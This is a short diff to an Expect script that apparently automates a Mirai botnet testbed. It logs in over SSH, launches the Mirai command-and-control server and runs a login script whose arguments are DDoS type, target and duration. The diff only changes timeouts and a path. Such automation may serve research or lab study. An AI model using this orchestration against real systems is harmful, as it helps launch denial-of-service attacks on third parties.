@@ -22,7 +22,7 @@ set input_bot_file "input_bot"
 set waitToFinishScan "WaitToFinishScan.py"
 set login_sh "login.sh"
 
-set timeout 1200
+set timeout 900
 
 # SSH connection
 spawn /bin/bash $delKnownHosts
@@ -32,13 +32,14 @@ expect "*continue connecting (yes/no*)? "
 send "yes\r"
 expect " password: "
 send "$password\r"
-set timeout 120
 
 # Record time
 set DATE [exec date +%s]
 set outputTimeFile [open $logs_path/$outputTime "w+"]
 puts $outputTimeFile $DATE
 close $outputTimeFile
+
+set timeout 300
 
 expect "*:~# "
 send "cd $path/$mirai_path\r"
@@ -54,7 +55,7 @@ send "nohup debug/cnc &\r"
 expect "output to 'nohup.out'"
 send "\r"
 expect "*mirai# "
-send "nohup $path/./$login_sh $numOfNewBots $DDoSType $targetedDDoS $dur $path $CNC_ip &\r"
+send "nohup $path/$login_sh $numOfNewBots $DDoSType $targetedDDoS $dur $path $CNC_ip &\r"
 expect "output to 'nohup.out'"
 send "\r"
 
